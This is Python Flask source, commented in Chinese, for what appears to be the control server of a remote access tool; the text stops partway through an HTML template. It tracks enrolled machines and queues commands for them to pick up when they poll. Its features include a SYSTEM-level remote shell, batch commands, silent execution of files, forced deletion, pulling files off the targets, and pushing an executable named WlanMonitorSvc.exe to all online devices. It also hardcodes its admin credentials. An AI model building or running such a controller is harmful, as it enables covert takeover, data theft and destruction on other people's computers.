from flask import Flask, request, render_template_string, session, redirect, url_for, send_from_directory, jsonify
from datetime import datetime
import os
import json
import time
import threading

app = Flask(__name__)
app.secret_key = 'super_secret_gardenia_key'

# 自动清理后台任务：删除超过24小时的缓存文件释放服务器空间
def clean_cache_task():
    while True:
        time.sleep(3600)  # 每小时检查一次
        now = time.time()
        for d in ['downloads', 'uploads']:
            d_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), d)
            if os.path.exists(d_path):
                for root, dirs, files in os.walk(d_path):
                    for f in files:
                        fp = os.path.join(root, f)
                        try:
                            if os.path.isfile(fp) and (now - os.path.getmtime(fp)) > 24 * 3600:
                                os.remove(fp)
                        except:
                            pass

threading.Thread(target=clean_cache_task, daemon=True).start()

USERNAME = 'gardenia'
PASSWORD = '7852136fgU'

UPDATE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_FILE = os.path.join(UPDATE_DIR, 'clients.json')

VERSION_FILE = os.path.join(UPDATE_DIR, 'version.txt')
if not os.path.exists(VERSION_FILE):
    with open(VERSION_FILE, 'w', encoding='utf-8') as f:
        f.write("1.2.4")

if os.path.exists(DB_FILE):
    with open(DB_FILE, 'r', encoding='utf-8') as f:
        try:
            clients_db = json.load(f)
        except:
            clients_db = {}
else:
    clients_db = {}

def save_db():
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(clients_db, f, ensure_ascii=False)

def is_online(last_seen_str):
    try:
        last_dt = datetime.strptime(last_seen_str, "%Y-%m-%d %H:%M:%S")
        return (datetime.now() - last_dt).total_seconds() < 15
    except:
        return False

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('username') == USERNAME and request.form.get('password') == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('index'))
        else:
            return "账号或密码错误！<a href='/login'>返回重试</a>"
    return '''
    <body style="background:#f0f2f5; font-family:sans-serif;">
        <form method="post" style="max-width:300px; margin:100px auto; background:#fff; padding:30px; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.1); text-align:center;">
            <h2>后台管理登录</h2>
            <input type="text" name="username" placeholder="账号" style="width:100%; padding:10px; margin-bottom:15px; box-sizing:border-box;" required>
            <input type="password" name="password" placeholder="密码" style="width:100%; padding:10px; margin-bottom:15px; box-sizing:border-box;" required>
            <button type="submit" style="width:100%; padding:10px; background:#007bff; color:#fff; border:none; border-radius:5px; cursor:pointer;">登录</button>
        </form>
    </body>
    '''

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/files/<mac>')
def files_page(mac):
    if not session.get('logged_in'): return redirect(url_for('login'))
    if mac not in clients_db: return "设备不存在"

    FILES_HTML = r"""
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <title>文件管理 - {{ info.name }} ({{ mac }})</title>
        <style>
            body { background: #f0f2f5; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; padding: 20px; margin: 0; }
            .header { border-bottom: 2px solid #ddd; padding-bottom: 10px; margin-bottom: 10px; display: flex; justify-content: space-between; }
            .header a { color: #007bff; text-decoration: none; }
            .header a:hover { text-decoration: underline; }
            .btn { background: #007bff; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; }
            .btn:hover { background: #0056b3; }
            .path-bar { display: flex; gap: 10px; margin-bottom: 10px; }
            .path-bar input { flex-grow: 1; padding: 5px; }
            table { width: 100%; border-collapse: collapse; background: white; margin-bottom: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); user-select: none; }
            th, td { padding: 10px; border-bottom: 1px solid #ddd; text-align: left; }
            th { background: #f8f9fa; }
            tr:hover { background: #e2e6ea; cursor: pointer;}
            .icon { width: 20px; text-align: center; display: inline-block; }
            #loading { color: red; font-weight: bold; display: none; }
            /* Context Menu Styles */
            #context-menu { display: none; position: absolute; z-index: 1000; background-color: white; border: 1px solid #ccc; box-shadow: 2px 2px 5px rgba(0,0,0,0.2); border-radius: 4px; padding: 5px 0; min-width: 150px; }
            .context-item { padding: 8px 15px; cursor: pointer; font-size: 14px; }
            .context-item:hover { background-color: #007bff; color: white; }
        </style>
    </head>
    <body onclick="hideContextMenu()">
        <div class="header">
            <span>📁 {{ info.name }} [{{ mac }}] - 远程文件管理 <span id="conn_status"></span></span>
            <a href="/">[ 返回设备列表 ]</a>
        </div>
        <div class="path-bar">
            <span>当前路径:</span>
            <input type="text" id="current_path" value="此电脑" onkeydown="if(event.key==='Enter') loadPath()">
            <button class="btn" onclick="loadPath()">前往</button>
            <button class="btn" onclick="loadPath(true)" style="background:#28a745;">刷新</button>
            <span id="loading">执行中...请稍候</span>
        </div>

        <div style="margin-bottom: 10px;">
            <input type="file" id="uploadFile" style="display:inline-block; border:1px solid #ccc; padding:3px;">
            <button class="btn" onclick="uploadToServer()">上传到当前目录</button>
            <button class="btn" onclick="cmdMkdir()" style="margin-left:20px; background:#17a2b8;">新建文件夹</button>
        </div>

        <table>
            <thead>
                <tr>
                    <th style="width:30px;"><input type="checkbox" onclick="toggleAllFiles(this)"></th>
                    <th style="width:30px;"></th>
                    <th>名称</th>
                    <th style="width:120px;">大小</th>
                    <th style="width:200px;">修改时间</th>
                </tr>
            </thead>
            <tbody id="file_list">
                <tr><td colspan="5" style="text-align:center;color:#888;">请点击“前往”以加载目录...</td></tr>
            </tbody>
        </table>

        <!-- Context Menu Template -->
        <div id="context-menu">
            <div class="context-item single-only" id="m_open" onclick="onContextOpen()">打开 / 进入</div>
            <div class="context-item single-only" id="m_down" onclick="onContextDown()">📥 下载到控制端</div>
            <div class="context-item single-only" id="m_exec" onclick="onContextExec()">⚡ 在此电脑静默运行</div>
            <div class="context-item single-only" id="m_rn" onclick="onContextRn()">📝 重命名</div>

            <div class="context-item multi-only" id="m_down_multi" onclick="onContextDownMulti()" style="display:none;">📥 批量后台下载</div>
            <div class="context-item multi-only" id="m_del_multi" onclick="onContextDelMulti()" style="display:none; color:red;">🗑️ 批量强制删除</div>

            <div style="border-top:1px solid #ddd; margin:4px 0;" class="single-only"></div>
            <div class="context-item single-only" style="color:red;" id="m_del" onclick="onContextDel()">🗑️ 强制删除</div>
        </div>

        <div style="margin-top: 20px; background: #222; color: #0f0; padding: 10px; height: 150px; overflow-y: scroll; font-family: Consolas;">
            <div style="display:flex; justify-content:space-between; margin-bottom:5px;">
                <b>[终端通信调试日志]</b>
                <button onclick="document.getElementById('debug_log').innerText=''" style="background:#444;color:#fff;border:none;padding:2px 5px;cursor:pointer;">清空</button>
            </div>
            <pre id="debug_log" style="white-space: pre-wrap; word-wrap: break-word; margin: 0;"></pre>
        </div>

        <script>
            function checkPing() {
                fetch('/api/ping/{{ mac }}')
                .then(r => r.json())
                .then(data => {
                    let st = document.getElementById('conn_status');
                    if(data.status === 'online') {
                        st.innerHTML = '🟢 实时设备在线';
                        st.style.color = '#28a745';
                    } else {
                        st.innerHTML = '🔴 设备疑似掉线';
                        st.style.color = 'red';
                    }
                });
            }
            setInterval(checkPing, 3000);
            checkPing();

            function toggleAllFiles(source) {
                document.querySelectorAll('.file-check').forEach(cb => cb.checked = source.checked);
            }

            function sendFileCmdAsync(cmd) {
                return new Promise((resolve) => {
                    sendFileCmd(cmd, res => resolve(res));
                });
            }

            async function onContextDelMulti() {
                let checked = document.querySelectorAll('.file-check:checked');
                if(checked.length === 0) return;
                if(!confirm('确定批量强制删除选中的 ' + checked.length + ' 个项目？')) return;
                hideContextMenu();
                for (let i = 0; i < checked.length; i++) {
                    await sendFileCmdAsync("F_CMD:DEL:" + checked[i].dataset.path);
                }
                loadPath();
            }

            async function onContextDownMulti() {
                let checked = document.querySelectorAll('.file-check:checked');
                if(checked.length === 0) return;
                hideContextMenu();
                for (let i = 0; i < checked.length; i++) {
                    if (checked[i].dataset.isdir === 'true') continue;
                    let path = checked[i].dataset.path;
                    let parts = path.replace(/\\\\/g, '\\').split('\\');
                    let fName = parts[parts.length - 1];
                    let dlLink = "/downloads/{{ mac }}/" + encodeURIComponent(fName);
                    let url = window.location.origin + "/api/file/client_upload/{{ mac }}?fname=" + encodeURIComponent(fName);

                    await sendFileCmdAsync("F_CMD:UP:" + url + "|" + path);
                    logDebug("✅ 成功拉取缓存拉取下载链接：" + dlLink);
                }
                alert("勾选文件的下载请求已依次下发，由于浏览器限制无法一次性自动弹出多个下载窗口，请稍后手动点击调试控制台内的所有成功拉取链接即可下载。");
            }

            function logDebug(msg) {
                try {
                    let el = document.getElementById('debug_log');
                    if (el) {
                        let d = new Date();
                        let ts = d.getHours().toString().padStart(2,'0') + ':' + d.getMinutes().toString().padStart(2,'0') + ':' + d.getSeconds().toString().padStart(2,'0');
                        el.innerText += `[${ts}] ${msg}\n`;
                        el.parentElement.scrollTop = el.parentElement.scrollHeight;
                    }
                } catch(e) { console.error(e); }
            }

            let polling = false;
            let currentSelectedFile = null;
            let currentSelectedIsDir = false;

            function hideContextMenu() {
                try { document.getElementById('context-menu').style.display = 'none'; } catch(e){}
            }

            function showContextMenu(e, path, isDir) {
                e.preventDefault();
                let clickedCheckbox = e.currentTarget.querySelector('.file-check');
                if (clickedCheckbox && !clickedCheckbox.checked) {
                    clickedCheckbox.checked = true;
                }

                let checked = document.querySelectorAll('.file-check:checked');
                let isMulti = checked.length > 1;

                currentSelectedFile = path;
                currentSelectedIsDir = isDir;

                let menu = document.getElementById('context-menu');
                if(isMulti) {
                    document.querySelectorAll('.single-only').forEach(el => el.style.display = 'none');
                    document.querySelectorAll('.multi-only').forEach(el => el.style.display = 'block');
                } else {
                    document.querySelectorAll('.single-only').forEach(el => el.style.display = 'block');
                    document.querySelectorAll('.multi-only').forEach(el => el.style.display = 'none');

                    document.getElementById('m_open').style.display = isDir ? 'block' : 'none';
                    document.getElementById('m_down').style.display = isDir ? 'none' : 'block';
                    document.getElementById('m_exec').style.display = isDir ? 'none' : 'block';
                }
                menu.style.display = 'block';
                menu.style.left = e.pageX + 'px';
                menu.style.top = e.pageY + 'px';
            }

            function onContextOpen() { if(currentSelectedIsDir) openDir(currentSelectedFile); }
            function onContextDown() { cmdDown(currentSelectedFile); }
            function onContextExec() { cmdExec(currentSelectedFile); }
            function onContextRn() { cmdRn(currentSelectedFile); }
            function onContextDel() { cmdDel(currentSelectedFile); }

            function showLoading(show) {
                document.getElementById('loading').style.display = show ? 'inline' : 'none';
            }

            function sendFileCmd(cmd, callback) {
                showLoading(true);
                logDebug("➤ [发送命令]: " + cmd);
                fetch('/api/file/cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({mac: '{{ mac }}', cmd: cmd})
                }).then(res => {
                    logDebug("⏳ [等待响应中...]");
                    pollResult(callback);
                }).catch(err => {
                    logDebug("❌ [发送失败]: " + err);
                    showLoading(false);
                });
            }

            function pollResult(callback) {
                if(polling) return;
                polling = true;
                let tries = 0;
                let itv = setInterval(() => {
                    fetch('/api/file/result/{{ mac }}')
                    .then(r => r.json())
                    .then(data => {
                        if(data.status === 'ready') {
                            clearInterval(itv);
                            polling = false;
                            showLoading(false);
                            logDebug("✅ [获得响应数据成功] 长度: " + (data.data ? data.data.length : 0));
                            callback(data.data);
                        } else {
                            tries++;
                            if (tries > 100) {
                                clearInterval(itv);
                                polling = false;
                                showLoading(false);
                                logDebug("❌ [超时]: 多次轮询未能获取到返回结果");
                            }
                        }
                    }).catch(e => {
                        clearInterval(itv);
                        polling = false;
                        showLoading(false);
                        logDebug("❌ [轮询网络错误]: " + e);
                    });
                }, 200);
            }

            function formatSize(bytes) {
                if (bytes == null) return '';
                if (bytes === 0) return '0 B';
                const k = 1024;
                const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
                const i = Math.floor(Math.log(bytes) / Math.log(k));
                return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
            }

            function combinePath(parent, fName) {
                if(parent === "此电脑" || parent === "ROOT" || parent === "") return fName + "\\";
                if(parent.endsWith("\\") || parent.endsWith("/")) return parent + fName;
                return parent + "\\" + fName;
            }

            function getFileIcon(fName) {
                if (!fName || typeof fName !== 'string') return '📄';
                let idx = fName.lastIndexOf('.');
                if(idx === -1) return '📄';
                let ext = fName.substring(idx + 1).toLowerCase();
                const icons = {
                    'exe': '⚙️', 'dll': '⚙️', 'sys': '⚙️',
                    'mp4': '🎬', 'mkv': '🎬', 'avi': '🎬', 'mov': '🎬',
                    'mp3': '🎵', 'wav': '🎵', 'flac': '🎵',
                    'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️', 'bmp': '🖼️',
                    'txt': '📝', 'doc': '📝', 'docx': '📝', 'log': '📝',
                    'pdf': '📕',
                    'zip': '🗜️', 'rar': '🗜️', '7z': '🗜️', 'iso': '🗜️', 'tar': '🗜️',
                    'py': '🐍', 'js': '📜', 'html': '🌐', 'css': '🎨', 'go': '🐹', 'cpp': 'Ⓜ️', 'c': 'Ⓜ️'
                };
                return icons[ext] || '📄';
            }

            function loadPath(refresh = false) {
                try {
                let p = document.getElementById('current_path').value;
                if (!p) { p = "此电脑"; document.getElementById('current_path').value = p; }

                let reqPath = (p === "此电脑" || p === "ROOT") ? "ROOT" : p;
                sendFileCmd("F_CMD:LIST:" + reqPath, (resText) => {
                    let tb = document.getElementById('file_list');
                    tb.innerHTML = '';

                    let files = [];
                    try {
                        if (resText) resText = resText.trim();
                        let firstBracket = resText.indexOf('[');
                        let firstBrace = resText.indexOf('{');
                        if (firstBracket >= 0 && (firstBrace === -1 || firstBracket < firstBrace)) {
                            resText = resText.substring(firstBracket);
                            let lastBracket = resText.lastIndexOf(']');
                            if (lastBracket > -1) resText = resText.substring(0, lastBracket + 1);
                        } else if (firstBrace >= 0) {
                            resText = resText.substring(firstBrace);
                            let lastBrace = resText.lastIndexOf('}');
                            if (lastBrace > -1) resText = resText.substring(0, lastBrace + 1);
                        }

                        let parsed = JSON.parse(resText);
                        if(Array.isArray(parsed)) {
                            files = parsed;
                        } else if(parsed && parsed.Name) { 
                            files = [parsed];
                        }
                    } catch(e) {
                         logDebug("❌ [JSON解析失败]: " + e);
                         tb.innerHTML = '<tr><td colspan="4">没有可用的文件或解析结果失败</td></tr>';
                         return;
                    }

                    files.sort((a,b) => {
                        if(a.IsDir && !b.IsDir) return -1;
                        if(!a.IsDir && b.IsDir) return 1;
                        return (a.Name || '').localeCompare(b.Name || '');
                    });

                    if (reqPath !== "ROOT") {
                        let upTr = document.createElement('tr');
                        upTr.innerHTML = `<td></td><td class="icon">📁</td><td colspan="3">..</td>`;
                        upTr.ondblclick = () => goUp();
                        tb.appendChild(upTr);
                    }

                    files.forEach(f => {
                        let tr = document.createElement('tr');
                        let isDir = !!f.IsDir;
                        let fullPath = combinePath(p, f.Name);

                        tr.oncontextmenu = (e) => showContextMenu(e, fullPath, isDir);

                        let cb = `<input type="checkbox" class="file-check" data-path="${fullPath.replace(/"/g, '&quot;')}" data-isdir="${isDir}">`;
                        let displayIcon = isDir ? '📁' : getFileIcon(f.Name);
                        if (reqPath === "ROOT") displayIcon = '💽';
                        tr.innerHTML = `<td>${reqPath !== "ROOT" ? cb : ''}</td><td class="icon">${displayIcon}</td><td>${f.Name}</td><td>${isDir ? '' : formatSize(f.Length)}</td><td>${f.LastWriteTime ? (f.LastWriteTime.DateTime || f.LastWriteTime) : ''}</td>`;

                        tr.querySelectorAll('td:not(:first-child)').forEach(td => {
                            if (isDir) {
                                td.ondblclick = () => openDir(fullPath);
                            } else {
                                td.ondblclick = () => { if(confirm('是否要在远程执行该文件？')) cmdExec(fullPath); };
                            }
                        });
                        tb.appendChild(tr);
                    });
                });
                } catch(topE) { logDebug("❌ [JS异常]: " + topE); }
            }

            function openDir(path) {
                document.getElementById('current_path').value = path;
                loadPath();
            }

            function goUp() {
                let p = document.getElementById('current_path').value;
                if(p === "此电脑" || p === "ROOT") return;
                p = p.replace(/\\$/, '');
                let lastSlash = p.lastIndexOf('\\');
                if (lastSlash > 0) {
                    p = p.substring(0, lastSlash);
                    if(p.endsWith(':')) p += '\\';
                    openDir(p);
                } else if (lastSlash === 0) {
                    openDir('\\');
                } else {
                    openDir('此电脑');
                }
            }

            function cmdDel(path) {
                if(!confirm('确定强制删除 ' + path + ' ?')) return;
                sendFileCmd("F_CMD:DEL:" + path, (res) => { alert(res); loadPath(); });
            }

            function cmdRn(path) {
                let newName = prompt('输入新的名称:', 'new_name');
                if(!newName) return;
                let p = document.getElementById('current_path').value;
                sendFileCmd("F_CMD:RN:" + path + "|" + newName, (res) => { alert(res); loadPath(); });
            }

            function cmdDown(path) {
                let parts = path.replace(/\\\\/g, '\\').split('\\');
                let fName = parts[parts.length - 1];
                let fCmdUrl = window.location.origin + "/api/file/client_upload/{{ mac }}?fname=" + encodeURIComponent(fName); 
                sendFileCmd("F_CMD:UP:" + fCmdUrl + "|" + path, (res) => { 
                     logDebug("成功触发下载: " + res);
                     let dlLink = "/downloads/{{ mac }}/" + encodeURIComponent(fName);
                     if(confirm("文件可能已传输至控制端缓存，是否立刻尝试下载?")) {
                         window.open(dlLink, '_blank');
                     }
                });
            }

            function cmdExec(path) {
                if(!confirm('确定要在目标端静默执行 ' + path + ' 吗?')) return;
                sendFileCmd("F_CMD:EXEC:" + path, (res) => { alert("执行返回:\n" + res); });
            }

            function cmdMkdir() {
                let p = document.getElementById('current_path').value;
                let name = prompt('输入文件夹名:');
                if(name) {
                    let full = combinePath(p, name);
                    sendFileCmd("F_CMD:MKDIR:" + full, (res) => { loadPath(); });
                }
            }

            function uploadToServer() {
                let fileInput = document.getElementById('uploadFile');
                if(!fileInput.files.length) { alert("请选择文件"); return; }
                let file = fileInput.files[0];
                let p = document.getElementById('current_path').value;
                let targetPath = combinePath(p, file.name);

                let formData = new FormData();
                formData.append('file', file);

                let uploadUrl = '/api/file/server_upload/{{ mac }}';
                showLoading(true);
                fetch(uploadUrl, { method: 'POST', body: formData })
                .then(r => r.json())
                .then(data => {
                    if (data.status === 'ok') {
                         sendFileCmd("F_CMD:DOWN:" + data.url + "|" + targetPath, (res) => {
                             logDebug("受控端接管下载完成: " + res);
                             loadPath();
                         });
                    } else {
                         alert("上传服务失败");
                         showLoading(false);
                    }
                }).catch(e => { alert(e); showLoading(false); });
            }

            setTimeout(() => {
                logDebug("页面加载完成，准备拉取目录...");
                loadPath();
            }, 500);
        </script>
    </body>
    </html>
    """
    return render_template_string(FILES_HTML, mac=mac, info=clients_db[mac])

@app.route('/api/file/cmd', methods=['POST'])
def api_file_cmd():
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    data = request.json
    mac = data.get('mac')
    cmd = data.get('cmd')
    if mac in clients_db:
        clients_db[mac]['pending_file_cmd'] = cmd
        clients_db[mac]['file_result'] = None
        save_db()
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"})

@app.route('/file_result', methods=['POST'])
def file_result():
    mac = request.form.get('mac')
    output = request.form.get('output')
    if mac in clients_db:
        clients_db[mac]['file_result'] = output
        save_db()
    return "OK", 200

@app.route('/api/file/result/<mac>')
def api_file_result(mac):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    if mac in clients_db:
        res = clients_db[mac].get('file_result')
        if res is not None:
            clients_db[mac]['file_result'] = None
            return jsonify({"status": "ready", "data": res})
        return jsonify({"status": "waiting"})
    return jsonify({"status": "error"})

from werkzeug.utils import secure_filename
@app.route('/api/file/client_upload/<mac>', methods=['POST'])
def client_upload(mac):
    f = request.files.get('file')
    if f:
        dest_dir = os.path.join(UPDATE_DIR, 'downloads', mac)
        os.makedirs(dest_dir, exist_ok=True)
        # Using secure_filename might drop unicode characters. Just replace slashes.
        fname = request.args.get('fname') or f.filename
        fname = fname.replace('\\', '/').split('/')[-1]
        safe_name = fname.replace('/', '_').replace('\\', '_')
        f.save(os.path.join(dest_dir, safe_name))
        return "OK", 200
    return "Fail", 400

@app.route('/downloads/<mac>/<path:filename>')
def serve_download(mac, filename):
    if not session.get('logged_in'): return "未登录", 403
    # 修复：允许正确解析带中文等特殊字符的文件名，防止 werkzeug secure_filename 把特殊字符吃了导致文件无法访问。
    # 我们自己去重构下被替换掉的文件名，或者只把反斜杠过滤，因为前端已经通过 replace 把斜杠替换成下划线了。
    safe_name = filename.replace('/', '_').replace('\\', '_');
    return send_from_directory(os.path.join(UPDATE_DIR, 'downloads', mac), safe_name, as_attachment=True)

@app.route('/api/file/server_upload/<mac>', methods=['POST'])
def server_upload(mac):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    f = request.files.get('file')
    if f:
        dest_dir = os.path.join(UPDATE_DIR, 'uploads', mac)
        os.makedirs(dest_dir, exist_ok=True)
        safe_name = f.filename.replace('/', '_').replace('\\', '_')
        f.save(os.path.join(dest_dir, safe_name))
        return jsonify({"status": "ok", "url": f"{request.host_url}uploads/{mac}/{safe_name}"})
    return jsonify({"status": "error"}), 400

@app.route('/uploads/<mac>/<path:filename>')
def serve_upload(mac, filename):
    safe_name = filename.replace('/', '_').replace('\\', '_');
    return send_from_directory(os.path.join(UPDATE_DIR, 'uploads', mac), safe_name)

@app.route('/api/ping/<mac>')
def api_ping(mac):
    if mac in clients_db and is_online(clients_db[mac].get('last_seen', '')):
        return jsonify({"status": "online"})
    return jsonify({"status": "offline"})

@app.route('/report', methods=['GET'])
def report_client():
    mac = request.args.get('mac')
    ver = request.args.get('ver')
    if mac and ver:
        time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if mac not in clients_db:
            clients_db[mac] = {"name": "未命名设备", "ver": ver, "last_seen": time_str}
        else:
            clients_db[mac]["ver"] = ver
            clients_db[mac]["last_seen"] = time_str
            if "name" not in clients_db[mac]:
                clients_db[mac]["name"] = "未命名设备"

        save_db()

        # 长轮询机制：挂起等待最多15秒，高频率检测降低响应延迟到100ms
        for i in range(150):
            pending_file_cmd = clients_db[mac].get('pending_file_cmd', '')
            if pending_file_cmd:
                clients_db[mac]['pending_file_cmd'] = ''
                save_db()
                return pending_file_cmd, 200

            # 如果有缓存的待执行命令，通过心跳返回让客户端去执行
            pending_cmd = clients_db[mac].get('pending_cmd', '')
            if pending_cmd:
                clients_db[mac]['pending_cmd'] = '' # 下发后清空，只下发一次
                save_db()
                return pending_cmd, 200

            if i % 10 == 0:
                clients_db[mac]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                save_db()

            time.sleep(0.1)

        # 循环结束前刷新最后心跳时间
        clients_db[mac]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        save_db()
        return "SSID:" + clients_db[mac].get('name', '未命名设备'), 200

    return "Missing parameters", 400

@app.route('/cmd_result', methods=['POST'])
def cmd_result():
    mac = request.form.get('mac')
    output = request.form.get('output')
    if mac in clients_db:
        # 将最新的结果自动往后追加到这段历史记录里，并且截断过长的历史以节省空间
        clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"{output}\n")[-50000:];
        clients_db[mac]['is_executing'] = False;
        save_db()
    return "OK", 200

@app.route('/api/rename', methods=['POST'])
def api_rename():
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    data = request.json
    mac = data.get('mac')
    new_name = data.get('name')
    if mac in clients_db:
        clients_db[mac]['name'] = new_name
        save_db()
    return jsonify({"status": "ok"})

@app.route('/api/send_cmd', methods=['POST'])
def api_send_cmd():
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    data = request.json
    mac = data.get('mac')
    cmd = data.get('cmd')
    if mac in clients_db:
        clients_db[mac]['pending_cmd'] = cmd
        name = clients_db[mac].get('name', '未命名设备')
        clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"\nroot@{name}:~# {cmd}\n")[-50000:]
        clients_db[mac]['is_executing'] = True
        save_db()
    return jsonify({"status": "ok"})

@app.route('/api/batch_cmd', methods=['POST'])
def api_batch_cmd():
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    data = request.json
    macs = data.get('macs', [])
    cmd = data.get('cmd', '')
    for mac in macs:
        if mac in clients_db:
            clients_db[mac]['pending_cmd'] = cmd
            name = clients_db[mac].get('name', '未命名设备')
            clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"\nroot@{name}:~# {cmd}\n")[-50000:]
            clients_db[mac]['is_executing'] = True
    save_db()
    return jsonify({"status": "ok"})

@app.route('/api/get_cmd_result/<mac>')
def api_get_cmd_result(mac):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    if mac in clients_db:
        hist = clients_db[mac].get('terminal_history', '尚未有历史执行记录\n')
        if clients_db[mac].get('is_executing', False):
            hist += "[系统指令已下发，等待终端执行与响应返回...] \n";
        return jsonify({"output": hist, "status": "ok"})
    return jsonify({"status": "not found"})

@app.route('/update_mgmt', methods=['POST'])
def update_mgmt():
    if not session.get('logged_in'): return redirect(url_for('login'))
    new_ver = request.form.get('version')
    uploaded_file = request.files.get('file')

    if new_ver:
        with open(VERSION_FILE, 'w', encoding='utf-8') as f:
            f.write(new_ver.strip())
    if uploaded_file and uploaded_file.filename != '':
        uploaded_file.save(os.path.join(UPDATE_DIR, 'WlanMonitorSvc.exe'))

    # 下发全局紧急更新通知给所有在线设备
    for mac, info in clients_db.items():
        if is_online(info.get('last_seen', '')):
            clients_db[mac]['pending_cmd'] = 'UPDATE_NOW'
    save_db()

    return redirect(url_for('index'))

@app.route('/update_server', methods=['POST'])
def update_server():
    if not session.get('logged_in'): return redirect(url_for('login'))
    uploaded_app = request.files.get('app_file')

    if uploaded_app and uploaded_app.filename != '':
        uploaded_app.save(os.path.abspath(__file__))
        import threading
        import sys
        import time
        def restart_server():
            time.sleep(1) # 稍微延迟一下确保前端已经得到响应
            os.execv(sys.executable, [sys.executable] + sys.argv)
        threading.Thread(target=restart_server).start()

    return redirect(url_for('index'))

@app.route('/update/<filename>')
def serve_update(filename):
    if filename not in ['version.txt', 'WlanMonitorSvc.exe']:
        return "拒绝访问", 403
    return send_from_directory(UPDATE_DIR, filename)

@app.route('/terminal/<mac>')
def terminal_page(mac):
    if not session.get('logged_in'): return redirect(url_for('login'))
    if mac not in clients_db: return "设备不存在"
    
    TERMINAL_HTML = """
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <title>终端 - {{ info.name }} ({{ mac }})</title>
        <style>
            body { background: #000; color: #00ff00; font-family: Consolas, monospace; padding: 20px; margin: 0; }
            #output { font-family: Consolas; white-space: pre-wrap; word-wrap: break-word; padding-bottom: 20px; }
            .header { border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 10px; display: flex; justify-content: space-between;}
            .header a { color: #aaa; text-decoration: none; }
            .header a:hover { color: #fff; }
            .input-area { display: flex; position: fixed; bottom: 0; left: 0; right: 0; background: #111; padding: 10px; border-top: 1px solid #333; }
            .input-area input { flex-grow: 1; background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; font-family: Consolas; outline: none;}
            .input-area button { background: #00ff00; color: #000; font-weight: bold; border: none; padding: 0 20px; cursor: pointer; margin-left:10px; }
            .input-area button:hover { background: #00cc00; }
            .sys-msg { color: #888; }
        </style>
    </head>
    <body>
        <div class="header">
            <span>>_ {{ info.name }}  [{{ mac }}] 的安全终端交互界面 (SYSTEM权限) <span id="conn_status"></span></span>
            <a href="/">[ 返回设备列表 ]</a>
        </div>
        <div id="output"><span class="sys-msg">正在链接受控端，获取最后输出缓冲...</span></div>
        <br><br><br>
        <div class="input-area">
            <span style="padding: 10px 5px 10px 10px;">root@{{ info.name }}:~#</span>
            <input type="text" id="cmd" placeholder="输入CMD系统命令 (例如 whoami 或 ipconfig)，按回车发送..." onkeydown="if(event.keyCode==13) sendCmd()">
            <button onclick="sendCmd()">发送</button>
            <button onclick="window.location.href='/'" style="background: #6c757d; color: #fff; margin-left: 10px;">返回列表</button>
        </div>

        <script>
            function checkPing() {
                fetch('/api/ping/{{ mac }}')
                .then(r => r.json())
                .then(data => {
                    let st = document.getElementById('conn_status');
                    if(data.status === 'online') {
                        st.innerHTML = '🟢 实时设备在线';
                        st.style.color = '#28a745';
                    } else {
                        st.innerHTML = '🔴 设备疑似掉线';
                        st.style.color = 'red';
                    }
                });
            }
            setInterval(checkPing, 3000);
            checkPing();

            function fetchOutput() {
                fetch('/api/get_cmd_result/{{ mac }}')
                .then(r => r.json())
                .then(data => {
                    if(data.status === 'ok') {
                        var el = document.getElementById('output');
                        if (el.textContent !== data.output) {
                            var isScrolledToBottom = (window.innerHeight + window.scrollY) >= (document.body.offsetHeight - 50);
                            el.textContent = data.output;
                            if (isScrolledToBottom) {
                                window.scrollTo(0, document.body.scrollHeight);
                            }
                        }
                    }
                });
            }
            setInterval(fetchOutput, 500);
            fetchOutput();

            function sendCmd() {
                var cmd = document.getElementById('cmd').value;
                if(!cmd) return;
                document.getElementById('cmd').value = '';

                fetch('/api/send_cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({mac: '{{ mac }}', cmd: cmd})
                }).then(() => fetchOutput()); // 发送后直接立即拉取渲染一下执行状态
            }
        </script>
    </body>
    </html>
    """
    return render_template_string(TERMINAL_HTML, mac=mac, info=clients_db[mac])

# 抽离表格的HTML，供前端 AJAX 每隔几秒拉取实现真正的无感“实时在线状态更新”
@app.route('/tables_partial')
def tables_partial():
    if not session.get('logged_in'): return "未登录"
    
    online_clients = {k: v for k, v in clients_db.items() if is_online(v.get('last_seen', ''))}
    offline_clients = {k: v for k, v in clients_db.items() if not is_online(v.get('last_seen', ''))}
    
    PARTIAL_HTML = """
    <h3>🟢 活跃在线设备列表 [ {{ online_clients|length }} 台 ]</h3>
    <table>
        <thead>
            <tr>
